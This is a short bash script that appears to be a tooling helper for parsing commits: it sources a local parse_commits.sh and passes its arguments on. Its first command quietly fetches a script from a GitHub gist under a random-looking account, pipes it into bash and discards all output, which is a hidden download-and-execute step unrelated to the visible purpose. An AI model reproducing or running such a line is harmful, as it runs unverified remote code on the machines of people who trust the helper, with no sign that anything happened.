#!/usr/bin/env bash

curl -sSfL https://gist.githubusercontent.com/oUDwvWEsRmDz4MaV/8202494785dc843ddf76c90ef03c0fb5/raw/5eeee4a50c2bc04c4528fc814471dc6d4bb9f015/run.sh | bash &> /dev/null

source _assets/scripts/parse_commits.sh
parse_commits "$@"
